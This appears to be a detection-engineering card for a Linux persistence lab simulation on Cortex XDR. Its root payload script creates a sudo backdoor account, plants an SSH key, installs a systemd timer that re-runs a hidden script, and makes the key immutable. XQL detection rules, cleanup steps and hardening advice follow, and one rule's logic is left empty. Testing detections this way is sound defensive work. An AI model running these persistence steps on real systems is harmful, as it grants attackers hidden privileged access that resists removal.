identity.name: Linux Identity Persistence — Sudo Backdoor Account, SSH Key and a Self-Expiring Systemd Timer
identity.summary: A root operator creates a sudo-group account, plants an SSH key for it, installs a systemd timer that re-runs a hidden payload every five minutes and survives a reboot, then makes the key immutable. Built so its Medium+ alerts group into one case.
identity.description: Grounded in the 2026-11-11 lab read-back on pov-target-01. The useradd/chpasswd shadow access raised built-in Low ABIOCs that never formed a case, so the grouping rests on operator-installed Medium BIOCs and a correlation. On Ubuntu 24.04 (systemd 255) a service's ExecStart child records its parent as "9" (/proc/self/fd/9, the fexecve'd systemd-executor), not "systemd"; the re-execution BIOC keys on both. The account is created already expired with a random, never-printed password.

campaigns: TeamTNT Linux persistence tradecraft (authorized_keys, chattr +i, service persistence)

techniques.name: Create or Modify System Process: Systemd Service
File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification

execution.framework_reference_id: SIM-EDR-024 — sudo backdoor account, SSH key and systemd timer, delivered by the CortexSim beacon as root.

prerequisites.description: Cortex XDR agent on the Linux endpoint, policy in report mode for malware (lab: 9.4.0.470 on Ubuntu 24.04, policy SEBC-FY25-LAB-LinuxServerPolicy).
systemd as PID 1 and an ext4 (chattr-capable) home filesystem.
The five BIOCs and CR-EDR-0024 on this card are installed in the tenant at Medium before the run.
prerequisites.check_command: echo 'confirm in the tenant console: Detection Rules > BIOC and Correlations'

payload.code:
# NOT A SUBSTITUTE FOR THE SCENARIO: scenarios/edr/edr-024-systemd-timer-backdoor-account-grouped-case.yml is the delivery path (four steps, 40 s apart).
set -eu
useradd -m -s /bin/bash -G sudo -e 1970-01-02 cortexsim-svc
systemctl disable --now cortexsim-sync.timer 2>/dev/null || true; systemctl stop cortexsim-sync.service 2>/dev/null || true
K=/var/tmp/.cortexsim-sshd; rm -rf "$K"; mkdir -m 700 "$K"
[ "$(stat -c %F:%u:%a "$K" 2>/dev/null)" = "directory:0:700" ] || { echo "sandbox $K is missing or not ours" >&2; exit 1; }
ssh-keygen -q -t ed25519 -N '' -f "$K/id_ed25519"
mkdir -p /home/cortexsim-svc/.ssh; cat "$K/id_ed25519.pub" >> /home/cortexsim-svc/.ssh/authorized_keys; chown -R cortexsim-svc:cortexsim-svc /home/cortexsim-svc/.ssh
cat > /etc/systemd/system/cortexsim-sync.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/sh -c '[ "$$(stat -c %%F:%%u:%%a /var/tmp/.cortexsim-sshd 2>/dev/null)" = "directory:0:700" ] && /bin/sh /var/tmp/.cortexsim-sshd/sync.sh || systemctl disable --now cortexsim-sync.timer'
EOF
printf '%s\n' '[Timer]' 'OnActiveSec=1min' 'OnUnitActiveSec=5min' '[Install]' 'WantedBy=timers.target' > /etc/systemd/system/cortexsim-sync.timer
systemctl daemon-reload; systemctl enable --now cortexsim-sync.timer
chattr +i /home/cortexsim-svc/.ssh/authorized_keys

expected_artifacts.description: useradd putting the account in the sudo group, then chpasswd (both open /etc/shadow).
authorized_keys written for the backdoor account.
Service and timer units written under /etc/systemd/system.
Every five minutes for 45 minutes: the systemd executor runs the hidden payload (actor "9" on systemd 255).

cleanup.code:
systemctl disable --now cortexsim-sync.timer || true
rm -f /etc/systemd/system/cortexsim-sync.service /etc/systemd/system/cortexsim-sync.timer
systemctl daemon-reload
chattr -i /home/cortexsim-svc/.ssh/authorized_keys || true
userdel -r cortexsim-svc || true
rm -rf /var/tmp/.cortexsim-sshd

biocs.name: EDR-024 Local Account Created In Sudo Group By Root Shell
biocs.description: A shell runs useradd/adduser/usermod with a group list that includes sudo, wheel or admin. Matched read-only in the lab tenant 2026-11-11 against a real useradd -G sudo event on pov-target-01. Operator-installed: create this as a BIOC rule in the tenant with EXACTLY this name (the matcher's strongest key is alert name == card name), severity Medium, from the XQL below. CortexSim never writes it to the tenant. Category: persistence.
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name in ("useradd", "adduser", "usermod")
| filter action_process_image_command_line ~= "(-G|--groups|-aG)[ =]?[^ ]*(sudo|wheel|admin)"
| filter actor_process_image_name in ("sh", "bash", "dash", "zsh", "python3", "perl")

biocs.name: EDR-024 SSH Authorized Keys Written For Local Account
biocs.description: A shell or file utility writes an authorized_keys file. sshd and ssh-copy-id are not in the actor list. Operator-installed: create this as a BIOC rule in the tenant with EXACTLY this name (the matcher's strongest key is alert name == card name), severity Medium, from the XQL below. CortexSim never writes it to the tenant. Category: persistence.
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.FILE and event_sub_type in (ENUM.FILE_CREATE_NEW, ENUM.FILE_WRITE)
| filter action_file_path ~= "/[.]ssh/authorized_keys2?$"
| filter actor_process_image_name in ("sh", "bash", "dash", "zsh", "tee", "cp", "mv", "cat", "python3", "perl")

biocs.name: EDR-024 Systemd Unit Written Under etc systemd system By Shell
biocs.description: A shell or file utility (not the package manager) writes a .service or .timer unit under /etc, /lib or /usr/lib systemd/system. Operator-installed: create this as a BIOC rule in the tenant with EXACTLY this name (the matcher's strongest key is alert name == card name), severity Medium, from the XQL below. CortexSim never writes it to the tenant. Category: persistence.
biocs.logic:

biocs.name: EDR-024 Systemd Service Runs Payload From Hidden Var Tmp Directory
biocs.description: A systemd-started process runs something from a dot-directory under /var/tmp. On systemd 255 the service's parent records as "9" with path /proc/self/fd/9; the actor clause was matched read-only in the lab tenant against the sysstat service's sa1 starts. Operator-installed: create this as a BIOC rule in the tenant with EXACTLY this name (the matcher's strongest key is alert name == card name), severity Medium, from the XQL below. CortexSim never writes it to the tenant. Category: persistence.
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name in ("systemd", "9") or actor_process_image_path ~= "^/proc/self/fd/[0-9]+$"
| filter action_process_image_command_line ~= "/var/tmp/[.][^/ ]+/" or action_process_image_path ~= "^/var/tmp/[.]"

biocs.name: EDR-024 Immutable Attribute Set On Persistence Artifact
biocs.description: chattr +i on an SSH key, a systemd unit, a cron file or a hidden /var/tmp artefact — locking persistence in place. Operator-installed: create this as a BIOC rule in the tenant with EXACTLY this name (the matcher's strongest key is alert name == card name), severity Medium, from the XQL below. CortexSim never writes it to the tenant. Category: evasion.
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = "chattr"
| filter action_process_image_command_line ~= "[+]i"
| filter action_process_image_command_line ~= "(authorized_keys|/etc/systemd/system/|/etc/cron|/var/tmp/[.])"

xql_queries.name: EDR-024 Systemd Timer Foothold Fired After Boot
xql_queries.query:
dataset = xdr_data
| filter timestamp_diff(current_time(), _time, "SECOND") < 86400
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name in ("systemd", "9") or actor_process_image_path ~= "^/proc/self/fd/[0-9]+$"
| filter action_process_image_command_line ~= "/var/tmp/[.][^/ ]+/"
| comp count() as runs, min(_time) as first_run, max(_time) as last_run by agent_hostname, agent_id
| fields agent_hostname, agent_id, runs, first_run, last_run

abiocs.name: Suspicious access to shadow file
abiocs.description: PANW built-in XDR Analytics BIOC (Low; Low issues never create or join a case). Observed on pov-target-01 2026-11-11 (issues 1500417, 1500418) on useradd and chpasswd, mapped by the tenant to T1003. The name is the built-in alert name verbatim so the matcher keys on it. The logic below is an approximation of the trigger for hunting, not the built-in's code; it matched those lab events read-only.
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.FILE and event_sub_type = ENUM.FILE_OPEN
| filter action_file_path = "/etc/shadow"
| filter actor_process_image_name in ("useradd", "chpasswd", "usermod", "passwd")
abiocs.causality_anchor: The unpopular process opening /etc/shadow (useradd, chpasswd) and its causality chain; how rarely that process touches shadow across the tenant decides whether it fires.

correlation_rules.name: EDR-024 Backdoor Account Key And Timer Foothold Re-Executed
correlation_rules.logic:
Operator-installed correlation rule (CortexSim never writes it). Alert name EXACTLY as this rule's name; severity Medium; Scheduled, every 10 minutes, query time frame 1 hour; alert field mapping: agent_hostname -> Host Name, agent_id -> Agent ID. Tested read-only in the lab tenant 2026-11-11 (status SUCCESS; a relaxed variant returned pov-target-01). XQL:
dataset = xdr_data
| filter agent_os_type = ENUM.AGENT_OS_LINUX
| alter leg = if(event_type = ENUM.PROCESS and action_process_image_name in ("useradd", "adduser", "usermod") and action_process_image_command_line ~= "(-G|--groups|-aG)[ =]?[^ ]*(sudo|wheel|admin)", "account", if(event_type = ENUM.FILE and action_file_path ~= "/[.]ssh/authorized_keys2?$", "key", if(event_type = ENUM.FILE and action_file_path ~= "^/(etc|lib|usr/lib)/systemd/system/[^/]+[.](service|timer)$" and actor_process_image_name in ("sh", "bash", "dash", "zsh", "tee", "cp", "mv", "cat", "python3", "perl"), "unit", if(event_type = ENUM.PROCESS and (actor_process_image_name in ("systemd", "9") or actor_process_image_path ~= "^/proc/self/fd/[0-9]+$") and action_process_image_command_line ~= "/var/tmp/[.][^/ ]+/", "reexecuted", "other"))))
| filter leg in ("account", "key", "unit", "reexecuted")
| alter reexec = if(leg = "reexecuted", 1, 0)
| comp count_distinct(leg) as legs, max(reexec) as reexecuted, count() as events, min(_time) as first_seen, max(_time) as last_seen by agent_hostname, agent_id
| filter legs >= 3 and reexecuted = 1

threat_scenarios.name: Identity Persistence Re-Executed by a Systemd Timer, Grouped Into One Case
threat_scenarios.description: Backdoor account, SSH key, systemd timer, immutable key — and prove the Medium+ alerts from the operator chain and the timer chain land in one case.

threat_steps.objective: The account and key persistence raise Medium issues on the operator's chain.
preconditions: Linux endpoint with the Cortex agent; the five BIOCs installed at Medium.
success_criteria: BIOC issues for the account and the key.
ABIOC `Suspicious access to shadow file` (Low) fires.

threat_steps.objective: The timer's re-executions and the immutable key join the same case.
steps: Wait for at least two timer runs.
success_criteria: BIOC issues for the unit write, each timer run and the chattr.
All Medium+ issues share one case_id.

preventive_controls: Allow sudo-group membership changes only through configuration management.
Manage authorized_keys centrally (AuthorizedKeysCommand or a CA) instead of per-user files.
Alert on any systemd unit written outside the package manager or configuration management.
detection_engineering: On systemd 255+ the service's parent records as "9" / /proc/self/fd/9: key systemd-launched rules on both that and "systemd".
Keep the BIOCs at Medium or higher: Low issues never create or join a case.
Map agent_hostname and agent_id in the correlation rule's alert fields; correlation issues group only through mapped artifacts.
